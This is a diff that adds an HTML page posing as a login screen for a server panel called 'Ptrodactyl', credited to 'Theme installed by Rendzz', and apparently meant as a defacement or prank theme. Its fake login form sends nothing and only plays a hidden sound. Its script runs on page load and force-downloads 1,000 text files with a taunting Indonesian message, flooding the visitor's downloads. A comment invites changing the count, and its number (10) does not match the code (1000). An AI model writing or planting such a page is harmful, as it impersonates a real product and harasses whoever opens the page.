@@ -1,0 +1,101 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Ptrodactyl</title>
+    <style>
+        body {
+            margin: 0;
+            padding: 0;
+            font-family: Arial, sans-serif;
+            background-image: url('https://pomf2.lain.la/f/j1azhod5.jpeg');
+            background-size: cover;
+            background-position: center;
+            color: white;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+        }
+        .login-box {
+            background-color: rgba(0, 0, 0, 0.8);
+            padding: 30px 20px;
+            border-radius: 10px;
+            text-align: center;
+            width: 300px;
+        }
+        .login-box img {
+            width: 80px;
+            margin-bottom: 20px;
+            border-radius: 50%;
+        }
+        .login-box input {
+            width: 100%;
+            padding: 10px;
+            margin: 8px 0;
+            border: none;
+            border-radius: 5px;
+            background: #333;
+            color: white;
+        }
+        .login-box button {
+            width: 100%;
+            padding: 10px;
+            background-color: red;
+            border: none;
+            border-radius: 5px;
+            color: white;
+            cursor: pointer;
+            margin-top: 10px;
+        }
+        .login-box button:hover {
+            background-color: darkred;
+        }
+        .forgot {
+            margin-top: 10px;
+            font-size: 12px;
+        }
+        .copyright {
+            margin-top: 15px;
+            font-size: 12px;
+            color: #777;
+        }
+        audio {
+            display: none;
+        }
+    </style>
+</head>
+<body>
+    <div class="login-box">
+        <img src="https://pomf2.lain.la/f/2t7qh1lq.png" alt="Logo">
+        <input type="text" placeholder="Username or Email"><br>
+        <input type="password" placeholder="Password"><br>
+        <button onclick="playSound()">Login</button>
+        <div class="forgot">FORGOT PASSWORD?</div>
+        <div class="copyright">Theme installed by Rendzz</div>
+        <audio id="munchkin-sound" src="https://pomf2.lain.la/f/c2ilyw.mp3"></audio>
+    </div>
+
+    <script>
+        function playSound() {
+            var sound = document.getElementById("munchkin-sound");
+            sound.play();
+        }
+
+        function autoDownload() {
+            for (let i = 0; i < 1000; i++) { // Ganti 10 jadi jumlah file yang lo mau
+                let link = document.createElement("a");
+                let file = new Blob(["Hai Aku Rendzz Sebang Mengenal mu"], { type: "text/plain" });
+                link.href = URL.createObjectURL(file);
+                link.download = `pesan_${i + 1}.txt`;
+                document.body.appendChild(link);
+                link.click();
+                document.body.removeChild(link);
+            }
+        }
+
+        window.onload = autoDownload; // File otomatis ter-download saat halaman dibuka
+    </script>
+</body>
+</html>
